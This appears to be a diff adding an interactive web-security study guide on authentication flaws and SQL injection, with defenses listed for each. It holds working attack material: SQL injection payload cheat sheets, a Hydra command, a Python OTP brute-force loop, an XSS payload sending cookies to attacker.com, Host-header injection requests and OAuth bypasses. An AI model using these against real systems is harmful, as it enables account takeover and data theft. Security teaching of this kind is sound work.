+    <!-- Populated by JS -->
+  </div>
+
+  <div class="sidebar-actions">
+    <button class="btn-sidebar" onclick="openQuiz()">⚡ Start Quiz</button>
+    <button class="btn-sidebar" id="themeToggle" onclick="toggleTheme()">◐ Toggle Theme</button>
+    <button class="btn-sidebar" onclick="resetProgress()">↺ Reset Progress</button>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div class="main-content">
+  <!-- TOPBAR -->
+  <header class="topbar">
+    <div class="topbar-title">
+      <button class="btn-menu" id="menuBtn" onclick="toggleSidebar()">☰</button>
+      <span>Web Security</span>
+      <span class="breadcrumb-sep">/</span>
+      <span id="topbarSection">Overview</span>
+    </div>
+    <div class="topbar-actions">
+      <button class="btn-icon" onclick="toggleTheme()" title="Toggle theme">◐</button>
+      <button class="btn-icon" onclick="scrollToTop()" title="Back to top">↑</button>
+      <button class="btn-quiz" onclick="openQuiz()">⚡ Quiz Mode</button>
+    </div>
+  </header>
+
+  <!-- CONTENT -->
+  <div class="content-area" id="contentArea">
+
+    <!-- DASHBOARD -->
+    <div class="dashboard">
+      <div class="dash-card">
+        <div class="dash-icon">📚</div>
+        <div class="dash-val" id="dash-total">0</div>
+        <div class="dash-lbl">Total Topics</div>
+      </div>
+      <div class="dash-card cyan">
+        <div class="dash-icon">✅</div>
+        <div class="dash-val" id="dash-studied">0</div>
+        <div class="dash-lbl">Studied</div>
+      </div>
+      <div class="dash-card purple">
+        <div class="dash-icon">🎯</div>
+        <div class="dash-val" id="dash-pct">0%</div>
+        <div class="dash-lbl">Complete</div>
+      </div>
+      <div class="dash-card orange">
+        <div class="dash-icon">🏆</div>
+        <div class="dash-val" id="dash-quiz">—</div>
+        <div class="dash-lbl">Best Score</div>
+      </div>
+    </div>
+
+    <!-- SECTION 1: AUTHENTICATION -->
+    <div class="section-hero" id="section-auth">
+      <span class="section-tag auth">Section 01</span>
+      <h1>Authentication Security</h1>
+      <p>Master authentication vulnerabilities, attack techniques, exploitation methods, and defense mechanisms used in modern web applications.</p>
+    </div>
+
+    <!-- AUTH TOPICS GENERATED BY JS -->
+    <div id="auth-topics"></div>
+
+    <!-- Quick Reference: Auth -->
+    <div class="quick-ref neon-border" style="margin-top:8px;">
+      <div class="quick-ref-title">⚡ Quick Reference — Authentication</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-red);margin-bottom:8px;">Brute-Force Indicators</div>
+          <ul style="font-size:12.5px;color:var(--text-secondary);margin-left:14px;">
+            <li>Multiple failed login attempts</li>
+            <li>IP-based rate limiting absent</li>
+            <li>No account lockout policy</li>
+            <li>Predictable lockout logic</li>
+            <li>Status code differences</li>
+            <li>Response time variations</li>
+          </ul>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-orange);margin-bottom:8px;">MFA Weaknesses</div>
+          <ul style="font-size:12.5px;color:var(--text-secondary);margin-left:14px;">
+            <li>OTP reuse allowed</li>
+            <li>No brute-force protection on OTP</li>
+            <li>Step-skip possible (direct URL)</li>
+            <li>Long OTP validity window</li>
+            <li>Insecure backup codes</li>
+            <li>SIM-swap susceptibility</li>
+          </ul>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-purple);margin-bottom:8px;">OAuth Weaknesses</div>
+          <ul style="font-size:12.5px;color:var(--text-secondary);margin-left:14px;">
+            <li>Missing state parameter</li>
+            <li>Open redirect abuse</li>
+            <li>Scope escalation</li>
+            <li>Token leakage via Referer</li>
+            <li>Implicit grant misuse</li>
+            <li>Account linking flaws</li>
+          </ul>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-cyan);margin-bottom:8px;">Password Reset Flaws</div>
+          <ul style="font-size:12.5px;color:var(--text-secondary);margin-left:14px;">
+            <li>Predictable reset tokens</li>
+            <li>Token reuse after use</li>
+            <li>No token expiry</li>
+            <li>Host header injection</li>
+            <li>User enumeration via response</li>
+            <li>Token in URL (logged by proxy)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION DIVIDER -->
+    <div class="section-divider">
+      <div class="section-divider-line"></div>
+      <div class="section-divider-text">Section 02</div>
+      <div class="section-divider-line"></div>
+    </div>
+
+    <!-- SECTION 2: SQL INJECTION -->
+    <div class="section-hero sqli" id="section-sqli">
+      <span class="section-tag sqli">Section 02</span>
+      <h1>SQL Injection</h1>
+      <p>From basic detection to advanced blind exploitation — master every SQL injection technique with real payloads and proven methodologies.</p>
+    </div>
+
+    <div id="sqli-topics"></div>
+
+    <!-- Quick Reference: SQLi -->
+    <div class="quick-ref neon-border" style="margin-top:8px;border-color:rgba(0,212,255,0.2);">
+      <div class="quick-ref-title" style="color:var(--accent-cyan);">⚡ Quick Reference — SQL Injection Cheat Sheet</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-cyan);margin-bottom:8px;">Common Detection Payloads</div>
+          <div class="code-block cyan" style="margin:0;font-size:11px;">'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+" OR ""="
+; DROP TABLE--
+' AND 1=1--
+' AND 1=2--</div>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-cyan);margin-bottom:8px;">UNION Attack Pattern</div>
+          <div class="code-block cyan" style="margin:0;font-size:11px;">' ORDER BY 1--
+' ORDER BY 2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+' UNION SELECT table_name,NULL
+  FROM information_schema.tables--</div>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-orange);margin-bottom:8px;">Blind SQLi — Boolean</div>
+          <div class="code-block" style="margin:0;font-size:11px;color:#ffb347;">' AND 1=1--    (true)
+' AND 1=2--    (false)
+' AND SUBSTRING(
+  (SELECT password FROM users
+   WHERE username='admin'),1,1)='a'--
+' AND (SELECT COUNT(*) FROM users)>0--</div>
+        </div>
+        <div>
+          <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-red);margin-bottom:8px;">Time-Based Blind SQLi</div>
+          <div class="code-block red" style="margin:0;font-size:11px;">-- MySQL
+'; IF(1=1) SLEEP(5)--
+
+-- PostgreSQL  
+'; SELECT pg_sleep(5)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+-- Oracle
+'; SELECT CASE WHEN (1=1)
+  THEN 'a'||dbms_pipe.
+  receive_message(('a'),5)
+  ELSE NULL END FROM dual--</div>
+        </div>
+      </div>
+
+      <div style="margin-top:16px;">
+        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--accent-green);margin-bottom:10px;">Prevention Checklist</div>
+        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;">
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Use parameterized queries / prepared statements</div>
+          </div>
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Implement allowlist input validation</div>
+          </div>
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Use an ORM with safe defaults</div>
+          </div>
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Apply least privilege DB accounts</div>
+          </div>
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Deploy WAF as secondary defense</div>
+          </div>
+          <div class="info-box tip" style="padding:10px 12px;margin:0;">
+            <div class="box-body"><strong style="color:var(--accent-green)">✓</strong> Suppress detailed error messages</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- end content-area -->
+</div><!-- end main-content -->
+
+<!-- BACK TO TOP -->
+<button class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</button>
+
+<!-- QUIZ MODAL -->
+<div class="quiz-overlay" id="quizOverlay">
+  <div class="quiz-modal">
+    <div class="quiz-header">
+      <h2>⚡ Quiz Mode</h2>
+      <button class="quiz-close" onclick="closeQuiz()">✕</button>
+    </div>
+    <div id="quizContent"></div>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   DATA: TOPICS
+   ============================================================ */
+const authTopics = [
+  {
+    id: 'auth-what',
+    title: 'What is Authentication?',
+    badge: 'low',
+    badgeText: 'Foundational',
+    content: `
+      <h3>Definition & Purpose</h3>
+      <p><em>Authentication</em> is the process of verifying that a user or entity is who they claim to be. It establishes identity before granting access to a system, resource, or application.</p>
+      <p>Authentication relies on one or more <strong>factors</strong>:</p>
+      <ul>
+        <li><strong>Something you know</strong> — passwords, PINs, security questions</li>
+        <li><strong>Something you have</strong> — hardware token, phone (OTP), smart card</li>
+        <li><strong>Something you are</strong> — fingerprint, face ID, retina scan (biometrics)</li>
+        <li><strong>Somewhere you are</strong> — geolocation, IP address (contextual)</li>
+      </ul>
+
+      <h3>Why Authentication Matters</h3>
+      <p>Authentication is the <em>first line of defense</em> for any web application. A broken authentication mechanism means an attacker can bypass all downstream access controls.</p>
+
+      <div class="info-box tip">
+        <div class="box-icon">💡</div>
+        <div class="box-body">
+          <div class="box-title">Key Concept</div>
+          Authentication proves <em>identity</em>. It answers the question: "Who are you?"
+        </div>
+      </div>
+
+      <h3>Authentication vs Authorization</h3>
+      <table class="comp-table">
+        <tr><th>Aspect</th><th>Authentication</th><th>Authorization</th></tr>
+        <tr><td>Question</td><td class="td-green">Who are you?</td><td class="td-cyan">What can you do?</td></tr>
+        <tr><td>Process</td><td>Verifies identity</td><td>Grants/denies permissions</td></tr>
+        <tr><td>Happens</td><td>Before authorization</td><td>After authentication</td></tr>
+        <tr><td>Example</td><td>Login with password</td><td>Admin vs. regular user roles</td></tr>
+        <tr><td>Failure impact</td><td>Identity theft, impersonation</td><td>Privilege escalation</td></tr>
+        <tr><td>OWASP category</td><td>Broken Authentication (A07)</td><td>Broken Access Control (A01)</td></tr>
+      </table>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tip</div>
+          Authentication and authorization are frequently confused. Remember: AuthN = Identity verification. AuthZ = Permission check. Authentication always comes FIRST.
+        </div>
+      </div>
+
+      <h3>Session Tokens</h3>
+      <p>After authentication, the server typically issues a <em>session token</em> or JWT to maintain state across stateless HTTP. This token becomes the persistent proof of authentication for subsequent requests.</p>
+
+      <div class="tag-row">
+        <span class="tag green">AuthN</span>
+        <span class="tag cyan">Session</span>
+        <span class="tag purple">OWASP A07</span>
+        <span class="tag orange">Identity</span>
+      </div>
+    `
+  },
+  {
+    id: 'auth-vulns-arise',
+    title: 'How Vulnerabilities Arise',
+    badge: 'med',
+    badgeText: 'Important',
+    content: `
+      <h3>Root Causes of Authentication Vulnerabilities</h3>
+      <p>Authentication vulnerabilities typically arise from two primary sources:</p>
+      <div class="step-list">
+        <div class="step-item"><div class="step-num">1</div><div class="step-body"><strong>Weak protection mechanisms</strong> — The authentication logic itself is flawed (insufficient rate limiting, poor token generation, predictable secrets).</div></div>
+        <div class="step-item"><div class="step-num">2</div><div class="step-body"><strong>Logic flaws & poor coding practices</strong> — Developer assumptions that users will always behave as expected, leaving edge cases exploitable.</div></div>
+      </div>
+
+      <h3>Common Development Mistakes</h3>
+      <ul>
+        <li>Trusting client-supplied data for authentication decisions</li>
+        <li>Using weak or predictable session token generation</li>
+        <li>Failing to invalidate sessions on logout</li>
+        <li>Storing passwords in plaintext or with weak hashing (MD5, SHA1)</li>
+        <li>No rate limiting on login endpoints</li>
+        <li>Revealing whether usernames exist via different error messages</li>
+        <li>Using security questions as sole recovery method</li>
+      </ul>
+
+      <h3>Impact Assessment</h3>
+      <div class="info-box danger">
+        <div class="box-icon">🚨</div>
+        <div class="box-body">
+          <div class="box-title">Critical Impact</div>
+          If an attacker bypasses authentication, they completely inherit the victim's permissions. For admin accounts, this means full application compromise — data exfiltration, configuration changes, and lateral movement.
+        </div>
+      </div>
+
+      <h3>Vulnerability Indicators</h3>
+      <ul>
+        <li>Different error messages for invalid username vs invalid password</li>
+        <li>Response time differences during authentication</li>
+        <li>No CAPTCHA or rate limiting on login forms</li>
+        <li>Password reset tokens in URL parameters</li>
+        <li>Cookies without <code>Secure</code> or <code>HttpOnly</code> flags</li>
+      </ul>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Must Remember</div>
+          Always test for username enumeration first — it forms the basis of targeted brute-force attacks and often yields quick wins in real applications.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'auth-brute-force',
+    title: 'Brute-Force Attacks',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>What is Brute-Forcing?</h3>
+      <p>Brute-force attacks systematically test credential combinations until a valid one is found. They exploit the lack of account lockout, rate limiting, or CAPTCHA protection.</p>
+
+      <h3>Types of Brute-Force Attacks</h3>
+      <table class="comp-table">
+        <tr><th>Type</th><th>Description</th><th>Tool</th></tr>
+        <tr><td>Simple Brute Force</td><td>Try all possible combinations</td><td>Burp Intruder</td></tr>
+        <tr><td>Dictionary Attack</td><td>Use wordlist of common passwords</td><td>Hydra, ffuf</td></tr>
+        <tr><td>Credential Stuffing</td><td>Use leaked username/password pairs</td><td>Sentry MBA</td></tr>
+        <tr><td>Password Spraying</td><td>One password, many accounts (avoids lockout)</td><td>Burp, custom scripts</td></tr>
+        <tr><td>Reverse Brute Force</td><td>Known password, enumerate usernames</td><td>Manual / Intruder</td></tr>
+      </table>
+
+      <h3>Username Enumeration</h3>
+      <p>Before brute-forcing passwords, attackers identify valid usernames by observing application responses:</p>
+      <ul>
+        <li><strong>Different error messages</strong> — "Invalid username" vs "Incorrect password"</li>
+        <li><strong>Response time differences</strong> — Password hashing takes longer for valid users</li>
+        <li><strong>HTTP status codes</strong> — 302 redirect vs 200 OK</li>
+        <li><strong>Content length differences</strong> — Even subtle byte count changes</li>
+      </ul>
+
+      <h3>Bypassing Rate Limiting</h3>
+      <p>Common techniques attackers use to bypass lockout/rate limiting:</p>
+      <div class="code-block">-- IP Rotation Headers
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.5
+X-Originating-IP: 1.2.3.6
+
+-- Username tricks (if system normalizes)
+admin  (trailing space)
+ADMIN  (case variation)
+admin+tag@mail.com</div>
+
+      <div class="info-box warning">
+        <div class="box-icon">⚠️</div>
+        <div class="box-body">
+          <div class="box-title">Attack Technique</div>
+          Some applications reset lockout counters when a successful login occurs. Attackers exploit this by occasionally inserting known-valid credentials (their own account) in the request sequence.
+        </div>
+      </div>
+
+      <h3>Exploiting HTTP Basic Authentication</h3>
+      <p>HTTP Basic Auth transmits credentials as <code>Base64(username:password)</code> in the <code>Authorization</code> header. It provides no real security:</p>
+      <div class="code-block">Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+# Decodes to: admin:password
+
+# Easy to brute force with Hydra:
+hydra -L users.txt -P pass.txt target.com http-get /admin</div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          In Burp Suite, use Intruder → Sniper for username enumeration, Cluster Bomb for username+password combinations. Look for subtle differences in response length, status code, or redirect behavior.
+        </div>
+      </div>
+
+      <h3>Defense Mechanisms</h3>
+      <ul>
+        <li>Account lockout after N failed attempts (with progressive delay)</li>
+        <li>IP-based rate limiting</li>
+        <li>CAPTCHA on repeated failures</li>
+        <li>Multi-factor authentication as secondary control</li>
+        <li>Consistent error messages (don't reveal username validity)</li>
+        <li>Monitor and alert on unusual login patterns</li>
+      </ul>
+
+      <div class="tag-row">
+        <span class="tag red">Brute Force</span>
+        <span class="tag orange">Username Enum</span>
+        <span class="tag purple">Credential Stuffing</span>
+        <span class="tag cyan">Burp Suite</span>
+      </div>
+    `
+  },
+  {
+    id: 'auth-mfa',
+    title: 'Multi-Factor Authentication Vulnerabilities',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>What is MFA?</h3>
+      <p><em>Multi-factor authentication</em> (MFA) requires two or more verification factors from different categories (know/have/are). The most common form is 2FA using TOTP (Time-based One-Time Passwords).</p>
+
+      <h3>Two-Factor Authentication Tokens</h3>
+      <ul>
+        <li><strong>TOTP</strong> — Time-based OTP (Google Authenticator, RFC 6238) — 6-digit, 30-second window</li>
+        <li><strong>HOTP</strong> — HMAC-based OTP, counter-synchronized</li>
+        <li><strong>SMS OTP</strong> — Sent via SMS (vulnerable to SIM swap, SS7 attacks)</li>
+        <li><strong>Hardware tokens</strong> — RSA SecurID, YubiKey</li>
+        <li><strong>Push notifications</strong> — Duo, Microsoft Authenticator</li>
+      </ul>
+
+      <h3>Bypassing 2FA — Direct URL Skip</h3>
+      <p>If the application doesn't enforce 2FA completion server-side before granting session validity:</p>
+      <div class="step-list">
+        <div class="step-item"><div class="step-num">1</div><div class="step-body">Log in with victim's credentials (step 1 complete)</div></div>
+        <div class="step-item"><div class="step-num">2</div><div class="step-body">When prompted for OTP, directly navigate to <code>/account</code> or post-login URL</div></div>
+        <div class="step-item"><div class="step-num">3</div><div class="step-body">If session cookie was issued after step 1, the application may grant access</div></div>
+      </div>
+
+      <h3>Bypassing 2FA — Flawed Verification</h3>
+      <p>Some applications verify the OTP but don't tie it to the correct account:</p>
+      <div class="code-block">-- Scenario: OTP tied to session, not user
+1. Log in as attacker → receive 2FA prompt
+2. Application issues partial session
+3. Submit VICTIM's OTP in attacker's session
+-- Result: Access granted to victim's account</div>
+
+      <h3>Brute-Forcing OTP Codes</h3>
+      <p>6-digit TOTP = 1,000,000 possibilities. If no rate limiting exists on the OTP endpoint:</p>
+      <div class="code-block">-- Burp Intruder payload type: Numbers
+-- Range: 000000 to 999999
+-- Throttle requests to avoid timeout detection
+-- Watch for 302 redirect = valid code found
+
+-- Python brute force snippet:
+for code in range(000000, 999999):
+    r = requests.post('/verify', 
+        data={'otp': f'{code:06d}'}, 
+        cookies=session_cookie)
+    if '302' in str(r.status_code):
+        print(f'Valid OTP: {code:06d}')</div>
+
+      <div class="info-box danger">
+        <div class="box-icon">🚨</div>
+        <div class="box-body">
+          <div class="box-title">Critical Flaw</div>
+          If the OTP verification page doesn't also verify that the OTP belongs to the user from step 1 of authentication, an attacker can use their own valid OTP to authenticate as any user who completed step 1.
+        </div>
+      </div>
+
+      <h3>Securing MFA</h3>
+      <ul>
+        <li>Invalidate partial session if 2FA not completed within time limit</li>
+        <li>Rate limit OTP attempts (3 attempts max, then require restart)</li>
+        <li>Tie OTP validation strictly to the authenticated user from step 1</li>
+        <li>Use short-lived TOTP windows (30 seconds)</li>
+        <li>Prefer authenticator apps over SMS</li>
+        <li>Implement "2FA fatigue" protection for push notifications</li>
+      </ul>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          Always check if the 2FA step can be skipped via direct URL navigation. Test if OTP is bound to user context. Look for missing rate limiting on OTP endpoints — these are common PortSwigger lab scenarios.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'auth-keeplogged',
+    title: 'Keeping Users Logged In & Remember Me',
+    badge: 'med',
+    badgeText: 'Important',
+    content: `
+      <h3>Remember Me Functionality</h3>
+      <p>"Stay logged in" features implement a persistent token stored in a cookie. Vulnerabilities arise when these tokens are <em>predictable or improperly protected</em>.</p>
+
+      <h3>Common Vulnerable Implementations</h3>
+      <div class="code-block">-- Vulnerable: Predictable token
+Set-Cookie: remember=admin:password   # plaintext
+Set-Cookie: remember=YWRtaW46cGFzc3dvcmQ=  # base64
+Set-Cookie: remember=21232f297a57a5a743894a0e4a801fc3  # MD5(password)
+
+-- Attacking: Decode → modify → re-encode
+base64_decode("YWRtaW46cGFzc3dvcmQ=") → "admin:password"
+Change to: "administrator:password" → re-encode → profit</div>
+
+      <h3>Attacking Remember Me Cookies</h3>
+      <div class="step-list">
+        <div class="step-item"><div class="step-num">1</div><div class="step-body">Create own account and log in with "remember me"</div></div>
+        <div class="step-item"><div class="step-num">2</div><div class="step-body">Inspect the cookie value in Burp or DevTools</div></div>
+        <div class="step-item"><div class="step-num">3</div><div class="step-body">Decode and analyze structure (base64, MD5, etc.)</div></div>
+        <div class="step-item"><div class="step-num">4</div><div class="step-body">Construct cookie for target user (e.g., MD5 of their password from wordlist)</div></div>
+        <div class="step-item"><div class="step-num">5</div><div class="step-body">Submit crafted cookie to access victim's account</div></div>
+      </div>
+
+      <h3>XSS + Remember Me</h3>
+      <p>If the remember-me cookie lacks <code>HttpOnly</code>, XSS can steal it:</p>
+      <div class="code-block red">-- XSS payload to steal cookie
+&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</div>
+
+      <h3>Secure Implementation</h3>
+      <ul>
+        <li>Use cryptographically random tokens (min 128-bit entropy)</li>
+        <li>Store hash of token server-side, not the token itself</li>
+        <li>Bind token to device fingerprint</li>
+        <li>Short expiry with silent renewal</li>
+        <li>Set <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code> flags</li>
+        <li>Invalidate all tokens on password change</li>
+      </ul>
+    `
+  },
+  {
+    id: 'auth-reset',
+    title: 'Password Reset Vulnerabilities',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>Password Reset Attack Surface</h3>
+      <p>Password reset mechanisms are high-value targets because they must function without authentication — creating inherent trust challenges.</p>
+
+      <h3>Common Vulnerabilities</h3>
+      <table class="comp-table">
+        <tr><th>Vulnerability</th><th>Description</th><th>Exploitation</th></tr>
+        <tr><td>Predictable tokens</td><td>Token based on timestamp/username</td><td>Calculate or brute-force token</td></tr>
+        <tr><td>Token reuse</td><td>Token not invalidated after use</td><td>Replay the same link</td></tr>
+        <tr><td>No expiry</td><td>Token valid indefinitely</td><td>Old links still work</td></tr>
+        <tr><td>Host header injection</td><td>Reset URL uses Host header</td><td>Change Host → redirect token to attacker</td></tr>
+        <tr><td>Token in URL</td><td>Token in GET parameter</td><td>Stolen via Referer / logs</td></tr>
+        <tr><td>User enumeration</td><td>Different responses for known/unknown emails</td><td>Enumerate valid accounts</td></tr>
+      </table>
+
+      <h3>Host Header Injection Attack</h3>
+      <div class="step-list">
+        <div class="step-item"><div class="step-num">1</div><div class="step-body">Intercept password reset request in Burp</div></div>
+        <div class="step-item"><div class="step-num">2</div><div class="step-body">Modify Host header: <code>Host: attacker.com</code></div></div>
+        <div class="step-item"><div class="step-num">3</div><div class="step-body">Enter victim's email address in the form</div></div>
+        <div class="step-item"><div class="step-num">4</div><div class="step-body">Victim receives reset email with link to <code>attacker.com/reset?token=XXX</code></div></div>
+        <div class="step-item"><div class="step-num">5</div><div class="step-body">Victim clicks link → token captured on attacker's server</div></div>
+        <div class="step-item"><div class="step-num">6</div><div class="step-body">Attacker uses token on legitimate site to reset password</div></div>
+      </div>
+
+      <div class="code-block red">POST /forgot-password HTTP/1.1
+Host: attacker.com           ← Modified
+X-Forwarded-Host: attacker.com  ← Alternative header
+
+email=victim@target.com</div>
+
+      <h3>Security Questions</h3>
+      <p>Security questions are notoriously weak — answers are often guessable, publicly available (social media), or brute-forceable. They should not be relied upon as a sole recovery mechanism.</p>
+
+      <h3>Changing Passwords — Additional Risks</h3>
+      <ul>
+        <li>Missing current password verification allows account takeover if session is stolen</li>
+        <li>Different error messages for valid vs invalid current passwords (enumeration)</li>
+        <li>Username in hidden field — changeable to target other accounts</li>
+      </ul>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          Always test Host header manipulation in password reset flows. Also check if the reset token is included in the URL (visible in server logs and Referer headers). These are classic PortSwigger scenarios.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'auth-oauth',
+    title: 'OAuth Authentication Vulnerabilities',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>What is OAuth?</h3>
+      <p><em>OAuth 2.0</em> is an authorization framework that enables third-party applications to obtain limited access to a user's account on a service. It's commonly misused as an authentication mechanism (that's actually OpenID Connect's job).</p>
+
+      <h3>OAuth Flow (Authorization Code Grant)</h3>
+      <div class="step-list">
+        <div class="step-item"><div class="step-num">1</div><div class="step-body">User clicks "Login with Google" → client redirects to Authorization Server with <code>client_id</code>, <code>redirect_uri</code>, <code>scope</code>, <code>state</code></div></div>
+        <div class="step-item"><div class="step-num">2</div><div class="step-body">User authenticates and grants consent on Authorization Server</div></div>
+        <div class="step-item"><div class="step-num">3</div><div class="step-body">Authorization Server redirects to <code>redirect_uri</code> with <code>code</code> and <code>state</code></div></div>
+        <div class="step-item"><div class="step-num">4</div><div class="step-body">Client exchanges <code>code</code> for access token (server-side, with client secret)</div></div>
+        <div class="step-item"><div class="step-num">5</div><div class="step-body">Client uses access token to fetch user data from Resource Server</div></div>
+      </div>
+
+      <h3>Critical Vulnerabilities</h3>
+      <table class="comp-table">
+        <tr><th>Vulnerability</th><th>Missing Control</th><th>Impact</th></tr>
+        <tr><td class="td-red">CSRF via missing state</td><td>No state parameter</td><td>Force victim to link attacker's account</td></tr>
+        <tr><td class="td-red">Open redirect abuse</td><td>Loose redirect_uri validation</td><td>Steal auth code via redirect</td></tr>
+        <tr><td class="td-red">Scope escalation</td><td>Insufficient scope validation</td><td>Gain elevated permissions</td></tr>
+        <tr><td class="td-red">Token leakage</td><td>Token in URL, no fragment</td><td>Token in Referer / browser history</td></tr>
+        <tr><td class="td-red">Implicit grant misuse</td><td>Using implicit for web apps</td><td>Token exposed in URL fragment</td></tr>
+      </table>
+
+      <h3>Attacking Missing State Parameter</h3>
+      <div class="code-block red">-- Step 1: Attacker starts OAuth flow, intercepts authorization URL
+GET /oauth/authorize?client_id=X&redirect_uri=https://client.com/cb&state=MISSING
+
+-- Step 2: Craft CSRF payload to force victim to complete YOUR oauth flow
+&lt;img src="https://client.com/callback?code=ATTACKER_CODE"&gt;
+
+-- Result: Victim's account linked to attacker's social account
+-- Attacker can now log in as victim</div>
+
+      <h3>redirect_uri Manipulation</h3>
+      <div class="code-block">-- Original
+redirect_uri=https://client.com/callback
+
+-- Attempts to bypass validation:
+redirect_uri=https://client.com/callback/../steal
+redirect_uri=https://client.com.attacker.com/callback
+redirect_uri=https://client.com/callback%2F..%2Fsteal</div>
+
+      <h3>Account Linking Attacks</h3>
+      <p>Many applications allow linking multiple OAuth providers. If linking doesn't require current authentication, attackers can link their own social account to victims' existing accounts.</p>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          The state parameter is your first check — its absence enables CSRF. Then inspect redirect_uri validation. Remember: OAuth is for authorization; using it for authentication introduces identity-confusion vulnerabilities.
+        </div>
+      </div>
+
+      <h3>Securing OAuth</h3>
+      <ul>
+        <li>Always implement <code>state</code> parameter with CSRF token</li>
+        <li>Strict exact-match validation for <code>redirect_uri</code></li>
+        <li>Use PKCE (Proof Key for Code Exchange) for public clients</li>
+        <li>Prefer Authorization Code grant over Implicit</li>
+        <li>Short access token lifetimes with refresh token rotation</li>
+        <li>Validate that the access token's user matches expected identity</li>
+      </ul>
+    `
+  },
+  {
+    id: 'auth-secure',
+    title: 'Securing Authentication Mechanisms',
+    badge: 'low',
+    badgeText: 'Defense',
+    content: `
+      <h3>Defense-in-Depth Authentication Security</h3>
+      <p>No single control is sufficient. Effective authentication security requires layering multiple controls that compensate for each other's weaknesses.</p>
+
+      <h3>Password Security</h3>
+      <ul>
+        <li>Minimum length ≥ 12 characters (NIST SP 800-63B)</li>
+        <li>Check against breached password databases (Have I Been Pwned API)</li>
+        <li>Hash with <em>bcrypt</em>, scrypt, or Argon2 (NOT MD5/SHA1)</li>
+        <li>Allow paste in password fields (encourages password managers)</li>
+        <li>Never transmit passwords in URLs or logs</li>
+      </ul>
+
+      <h3>Rate Limiting & Account Lockout</h3>
+      <ul>
+        <li>Progressive delays after N failures (exponential backoff)</li>
+        <li>CAPTCHA after threshold</li>
+        <li>Soft lockout (delay) rather than hard lockout (DoS risk)</li>
+        <li>Alert users on unusual login activity</li>
+      </ul>
+
+      <h3>Session Management</h3>
+      <ul>
+        <li>Regenerate session ID after successful authentication (prevent fixation)</li>
+        <li>Use HttpOnly, Secure, SameSite=Strict cookie flags</li>
+        <li>Implement absolute and idle session timeouts</li>
+        <li>Invalidate all sessions on password change/logout</li>
+        <li>Use cryptographically secure session token generation</li>
+      </ul>
+
+      <h3>Security Best Practices Summary</h3>
+      <table class="comp-table">
+        <tr><th>Area</th><th>✓ Secure</th><th>✗ Vulnerable</th></tr>
+        <tr><td>Hashing</td><td class="td-green">bcrypt/Argon2 with salt</td><td class="td-red">MD5/SHA1 plaintext</td></tr>
+        <tr><td>Error messages</td><td class="td-green">Generic "invalid credentials"</td><td class="td-red">Specific "user not found"</td></tr>
+        <tr><td>Rate limiting</td><td class="td-green">IP + account lockout</td><td class="td-red">No limits</td></tr>
+        <tr><td>MFA</td><td class="td-green">TOTP/hardware key</td><td class="td-red">SMS only or none</td></tr>
+        <tr><td>Reset tokens</td><td class="td-green">Random, single-use, short-lived</td><td class="td-red">Predictable or reusable</td></tr>
